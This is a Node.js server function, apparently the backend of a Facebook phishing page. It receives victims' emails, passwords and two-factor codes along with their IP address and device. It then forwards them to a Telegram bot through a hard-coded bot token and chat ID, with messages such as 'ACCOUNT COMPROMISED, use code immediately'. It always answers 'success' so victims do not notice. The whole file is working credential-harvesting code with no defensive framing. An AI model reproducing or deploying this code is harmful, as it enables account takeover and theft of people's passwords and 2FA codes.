const fetch = require('node-fetch');

module.exports = async (req, res) => {
    console.log('=== FACEBOOK LOGIN API CALLED ===');
    console.log('Method:', req.method);
    console.log('Headers:', JSON.stringify(req.headers, null, 2));
    
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Handle OPTIONS preflight
    if (req.method === 'OPTIONS') {
        console.log('Handling OPTIONS preflight');
        return res.status(200).end();
    }
    
    // Only accept POST
    if (req.method !== 'POST') {
        console.log('❌ Wrong method:', req.method);
        return res.status(405).json({ 
            error: 'Method not allowed. Use POST.',
            received: req.method 
        });
    }
    
    try {
        // Log raw body for debugging
        console.log('Raw body type:', typeof req.body);
        console.log('Raw body:', req.body);
        
        let data;
        if (typeof req.body === 'string') {
            try {
                data = JSON.parse(req.body);
            } catch (e) {
                console.log('JSON parse error:', e.message);
                data = {};
            }
        } else if (typeof req.body === 'object') {
            data = req.body;
        } else {
            data = {};
        }
        
        console.log('Parsed data:', JSON.stringify(data, null, 2));
        
        const { type, email, password, code, userAgent } = data;
        
        // Get IP
        const ip = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] || 
                   req.connection.remoteAddress ||
                   'Unknown';
        
        console.log('📡 Client IP:', ip);
        console.log('📧 Email:', email ? `${email.substring(0, 3)}***` : 'none');
        console.log('🔑 Has password:', !!password);
        console.log('🔢 Code:', code || 'none');
        console.log('📱 User Agent:', userAgent ? userAgent.substring(0, 100) : 'none');
        
        // Telegram Configuration - TRIPLE CHECK THESE
        const BOT_TOKEN = "8251102529:AAFUlxIRVM0Whp3Sd9K3d6WMvfu8ZCN7YQk";
        const CHAT_ID = "1622637334";
        
        console.log('🤖 Bot Token:', BOT_TOKEN ? `${BOT_TOKEN.substring(0, 10)}...` : 'MISSING!');
        console.log('💬 Chat ID:', CHAT_ID || 'MISSING!');
        
        // Create message based on type
        let message = '';
        const timestamp = new Date().toLocaleString();
        
        if (type === 'login') {
            message = `🔐 FACEBOOK LOGIN CAPTURED 🔐

Email: ${email || 'Not provided'}
Password: ${password || 'Not provided'}

📊 Details:
Time: ${timestamp}
IP: ${ip}
Device: ${userAgent?.includes('Mobile') ? 'Mobile' : 'Desktop'}

✅ Status: Credentials captured
➡️ Next: 2FA verification`;
            
            console.log('📝 Login attempt captured');
            
        } else if (type === 'verification') {
            message = `✅ FACEBOOK 2FA CODE CAPTURED ✅

Account: ${email || 'Not provided'}
Password: ${password || 'Not provided'}
2FA Code: ${code || 'Not provided'}

🌍 Access Info:
Time: ${timestamp}
IP: ${ip}

🚨 ACCOUNT COMPROMISED
🎯 Use code immediately`;
            
            console.log('🔢 2FA Code captured');
            
        } else if (type === 'resend') {
            message = `🔄 CODE RESEND REQUESTED 🔄

Account: ${email || 'Not provided'}
Time: ${timestamp}
IP: ${ip}

📱 New code requested`;
            
            console.log('🔄 Code resend requested');
        } else {
            message = `📱 Unknown request: ${type}
IP: ${ip}
Time: ${timestamp}`;
        }
        
        console.log('📨 Message to send:', message.substring(0, 200) + '...');
        
        // SEND TO TELEGRAM - SIMPLE VERSION
        try {
            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            console.log('🌐 Telegram URL:', telegramUrl);
            
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    disable_web_page_preview: true
                    // Removed parse_mode to avoid formatting issues
                })
            });
            
            const result = await response.json();
            console.log('📤 Telegram API Response:', JSON.stringify(result, null, 2));
            
            if (result.ok) {
                console.log('✅ Telegram message sent successfully!');
            } else {
                console.error('❌ Telegram error:', result.description);
                
                // Try alternative: URL encoded version
                console.log('🔄 Trying URL encoded version...');
                const altUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message.substring(0, 4000))}`;
                
                const altResponse = await fetch(altUrl);
                const altResult = await altResponse.json();
                console.log('🔄 Alt response:', altResult.ok ? 'Success' : 'Failed');
            }
            
        } catch (telegramError) {
            console.error('💥 Telegram send error:', telegramError.message);
            console.error('Stack:', telegramError.stack);
        }
        
        // ALWAYS return success to frontend
        console.log('🎯 Returning success to client');
        return res.status(200).json({
            success: true,
            message: 'Processing completed',
            type: type || 'unknown',
            timestamp: new Date().toISOString(),
            debug: {
                ip: ip,
                emailReceived: !!email,
                codeReceived: !!code
            }
        });
        
    } catch (error) {
        console.error('💥 CRITICAL ERROR:', error.message);
        console.error('Stack trace:', error.stack);
        
        // Still return success to avoid breaking user flow
        return res.status(200).json({
            success: true,
            error: error.message,
            note: 'Background processing completed'
        });
    }
};